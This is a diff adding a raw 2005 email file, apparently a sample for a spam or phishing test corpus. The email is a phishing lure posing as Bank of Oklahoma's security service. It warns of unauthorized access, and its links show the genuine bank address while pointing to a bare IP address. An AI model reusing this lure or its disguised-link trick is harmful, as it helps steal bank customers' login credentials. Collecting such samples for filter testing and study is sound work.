@@ -1,0 +1,76 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 4F3FB2A88C
+ for <user@example.com>; Wed, 26 Oct 2005 19:44:01 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+ id 42402621C99; Wed, 26 Oct 2005 19:44:01 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id 28922621C95
+ for <user@example.com>; Wed, 26 Oct 2005 19:44:01 -0400 (EDT)
+Received: (from user@localhost) by mail.example.com id TAA23719
+ for user@example.com; Wed, 26 Oct 2005 19:43:59 -0400
+Received: from 67.15.189.41 (ev1s-67-15-189-41.ev1servers.net [67.15.189.41]
+ (may be forged)) by mail.example.com with SMTP id TAA23711
+ for <user@biochemistry.bioc.cwru.edu>; Wed, 26 Oct 2005 19:43:59 -0400
+Received: from 173.222.40.240 by ; Thu, 27 Oct 2005 01:43:58 +0100
+Message-ID: <JJFTQFHONOGIJFJDWIPDXARVW@comcast.net>
+From: "Bank of Oklahoma Security Service" <confirm@bok.com>
+Reply-To: "Bank of Oklahoma Security Service" <security@bok.com>
+To: user@biochemistry.bioc.cwru.edu
+Subject: WARNING: CONFIRM YOUR ONLINE BANKING RECORDS
+Date: Thu, 27 Oct 2005 04:42:58 +0400
+X-Mailer: Microsoft Outlook, Build 10.0.2616
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--96490487535732044"
+X-Priority: 3
+X-MSMail-Priority: Normal
+Content-Length: 2595
+Lines: 39
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 212
+
+----96490487535732044
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1=
+-transitional.dtd">=0A=0A<html>=0A=0A	<head>=0A		<meta http-equiv=3D"Conte=
+nt-Type" content=3D"text/html; charset=3Diso-8859-1" />=0A		<title></title=
+>=0A		=0A			</head>=0A	=0A	<body bgcolor=3D"#ffffff">=0A				=0A      =0A<p=
+>=0A<a href=3D"http://218.188.24.73/onlinebanking.bankofoklahoma.com/Onlin=
+eBanking/">=0A<img border=3D"0" src=3D"http://www.bankofoklahoma.com/gfx/s=
+wooshlogobok.gif" width=3D"366" height=3D"95"></a><br clear=3D"all" />=0A =
+     </p>=0A      <div id=3D"privacy">=0A        <div class=3D"edas">=0A	<=
+div class=3D"edas">=0A =0A				<b>Dear Bank of Oklahoma customer</b><b clas=
+s=3D"edas">. Please read this =0A				message and follow it's instructions.=
+</b><br><br> <br>=0A				<b class=3D"edas">Unauthorized Account Access </b>=
+<br>We recently =0A				reviewed your account, and we suspect an unauthoriz=
+ed ATM based =0A				transaction on your account. Therefore as a preventive=
+ measure =0A				we have temporary limited your access to sensitive Bank of=
+ Oklahoma=0A				features. <br><br>To ensure that your account is not compr=
+omised =0A				please login to Bank of Oklahoma Internet Banking and Invest=
+ing by =0A				clicking this=0A                <a target=3D"_blank" href=3D=
+"http://218.188.24.73/onlinebanking.bankofoklahoma.com/OnlineBanking/">lin=
+k</a>, verify your identify and your online =0A				accounts will be reacti=
+vated by our system. <br><br>=0A				<b class=3D"edas">To get started, plea=
+se click the link below:</b><br> <br>=0A				<a href=3D"http://218.188.24.7=
+3/onlinebanking.bankofoklahoma.com/OnlineBanking/">=0A                http=
+s://onlinebanking.bankofoklahoma.com/OnlineBanking/login.aspx?ReturnUrl=3D=
+%2fOnlineBanking%2fDefault.aspx</a><p><br>=0A				<b class=3D"edas">Importa=
+nt information from Bank of Oklahoma.</b> <br>This =0A				e-mail contains =
+information directly related to your account =0A				with us, other service=
+s to witch you have subscribed, and/or any =0A				application you may have=
+ submitted.<br>Bank of Oklahoma and its service =0A				providers are commi=
+tted to protecting your privacy and ask you =0A				to send sensitive accou=
+nt information through e-mail.<br> =0A				</p>=0A				<p style=3D"text-alig=
+n:Center" class=3D"edas">_________________________________________________=
+______________________</p>=0A				=0A		  =0A	  =0A	 =0A</div>=0A=0A	</div>=0A=
+         </p>=0A	</div>=0A</body>=0A</html>
+
+----96490487535732044--
